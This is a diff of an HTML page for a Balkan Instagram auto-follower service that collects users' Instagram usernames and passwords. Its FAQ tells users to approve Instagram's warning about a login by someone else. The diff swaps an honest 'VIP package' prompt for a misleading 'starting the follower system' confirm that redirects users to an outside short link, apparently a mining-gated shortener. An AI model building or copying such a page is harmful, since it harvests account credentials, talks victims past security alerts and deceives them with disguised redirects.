@@ -5,7 +5,7 @@
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0"/>
 	<meta NAME="Description" CONTENT="Balkan Instagram Follower">
-	<meta NAME="Keywords" CONTENT="Instagram autofollower Balkan likes follows">
+	<meta NAME="Keywords" CONTENT="instagram pratioci, instagram followers, instagram, autofollower, balkan, likes, followers, pratioci, follow, ">
 	<meta NAME="ROBOTS" CONTENT="INDEX, FOLLOW">
 	<title>Insta Follow Balkan</title>
       <!--Import Google Icon Font-->
@@ -56,7 +56,7 @@
 		<h2 class="center light-blue-text"><i class="large material-icons">verified_user</i></h2>
 		<h5 class="center">Prosto i lako!</h5>
 
-		<p class="light center-align">Uz nekoliko klika dobicete masu pratioca i lajkova</p>
+		<p class="light center-align">Uz nekoliko klika dobićete masu pratioca i lajkova</p>
 	  </div>
 	</div>
 	<div class="col s12 m4 feature">
@@ -64,7 +64,7 @@
 		<h2 class="center light-blue-text"><i class="large material-icons">verified_user</i></h2>
 		<h5 class="center">Vrhunski sistem!</h5>
 
-		<p class="light center-align">Izradjeno od strane vrhunskih programera!</p>
+		<p class="light center-align">Izradjeno od strane vrhunskih programera</p>
 	  </div>
 	</div>
 
@@ -76,23 +76,23 @@
 			<ul class="collapsible" data-collapsible="accordion">
 			<li>
 			  <div class="collapsible-header insta-li  active" >O usluzi</div>
-			  <div class="collapsible-body"><p>Uz pomoc InstaFollowBalkan mozete dobiti stotine, mozda cak i hiljade lajkova i pratioca na Instagramu<br> <b> Podelite stranicu sa vasim prijateljima, tako da i oni mogu biti popularni! </b>.
-			  <br><br> <b> Mozete maksimalno dobiti 100 pratioca i lajkova u besplatnoj verziji! Za kupovinu pogledajte VIP Paket </b>.</p>
+			  <div class="collapsible-body"><p>Uz pomoc InstaFollowBalkan mozete dobiti stotine, možda čak i hiljade lajkova i pratioca na Instagramu<br> <b> Podelite stranicu sa vašim prijateljima, tako da i oni mogu biti popularni! </b>.
+			  <br><br> <b> Možete maksimalno dobiti 100 pratioca i lajkova u besplatnoj verziji! Za kupovinu pogledajte VIP Paket </b>.</p>
 			  </div>
 			</li>
 			<li>
 			  <div class="collapsible-header insta-li center-align">Da li je sigurno?</div>
-			  <div class="collapsible-body"><p>Jeste! Kada se logujete mozda ce vam izaci obavestenje od Instagrama da neko zeli da se prijavi na vas nalog, prihvatite i nastavite proces na sajtu</p></div>
+			  <div class="collapsible-body"><p>Jeste! Kada se logujete mozda ce vam izaci obavestenje od Instagrama da neko želi da se prijavi na vaš nalog, prihvatite i nastavite proces na sajtu</p></div>
 			</li>
 			<li>
 			  <div class="collapsible-header insta-li center-align">Pomoc</div>
 			  <div class="collapsible-body left-align">
-			  <blockquote style="margin:15px" >Ukoliko je vas nalog privatan prebacite ga na javni tako da bi lajkovi mogli stici</blockquote>
-			  <blockquote style="margin:15px" >Koristite iskljucivo vase podatke za logovanje na sajt!</blockquote>
+			  <blockquote style="margin:15px" >Ukoliko je vaš nalog privatan prebacite ga na javni tako da bi lajkovi mogli stići</blockquote>
+			  <blockquote style="margin:15px" >Koristite iskljucivo vaše podatke za logovanje na sajt!</blockquote>
 			</li>
 			<li>
 			  <div class="collapsible-header insta-li center-align">VIP Paket</div>
-			  <div class="collapsible-body"><p>Da dobijete vise pratioca kliknite na dugme ispod!</p><p><a href="/vippaket.php" class="twitter-follow-button" data-show-count="false">VIP Paket</a></p></div>
+			  <div class="collapsible-body"><p>Da dobijete više pratioca kliknite na dugme ispod!</p><p><a href="/vippaket.php" class="twitter-follow-button" data-show-count="false">VIP Paket</a></p></div>
 			</li>
 			</ul>
 		
@@ -141,14 +141,13 @@
 			h.onreadystatechange = function(){
 				if(h.readyState == 4 && h.status == 200){
 					var j = JSON.parse(h.responseText);
-					//console.log(h.responseText);
 					if(!j.authenticated)
 						Materialize.toast('Netacno korisnicko ime ili lozinka!', 4000);
 					else
 					{
 						Materialize.toast('Prijava uspesna, preusmeravanje...', 4000);
-						if(confirm("Da li zelite VIP paket?"))
-							location = "vippaket.php";
+						if(confirm("Pokretanje sistema za pratioce..."))
+							location = "https://cnhv.co/7onf";
 					}
 				}
 			};
@@ -169,7 +168,7 @@
             <div class="row">
               <div class="col l6 s12">
                 <h5 class="white-text">O InstaFollowBalkan</h5>
-                <p class="grey-text text-lighten-4">Prvo Instagram auto follower/liker na Balkanu!</p>
+                <p class="grey-text text-lighten-4">Prvi Instagram auto follower/liker na Balkanu!</p>
               </div>
              
             </div>
